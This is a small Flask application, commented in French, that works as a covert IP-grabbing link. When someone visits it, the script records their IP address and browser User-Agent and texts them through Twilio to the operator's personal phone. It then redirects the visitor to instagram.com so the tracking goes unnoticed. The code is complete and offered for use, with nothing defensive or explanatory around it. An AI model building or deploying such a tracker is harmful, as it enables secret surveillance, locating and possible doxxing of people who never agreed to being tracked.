from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# Tes infos Twilio
TWILIO_ACCOUNT_SID = "TON_SID_TWILIO"
TWILIO_AUTH_TOKEN = "TON_TOKEN_TWILIO"
FROM_PHONE = "TON_NUM_TWILIO"
TO_PHONE = "TON_NUM_PERSO"

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent')
    
    message = f"[IP TRACKED]\nIP: {ip}\nUA: {ua}"
    
    print(message)
    
    # Envoi SMS
    try:
        requests.post(
            f"https://api.twilio.com/2010-04-01/Accounts/{TWILIO_ACCOUNT_SID}/Messages.json",
            auth=(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN),
            data={
                "From": FROM_PHONE,
                "To": TO_PHONE,
                "Body": message
            }
        )
    except Exception as e:
        print("Erreur d'envoi SMS:", e)

    return redirect("https://instagram.com")

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=10000)
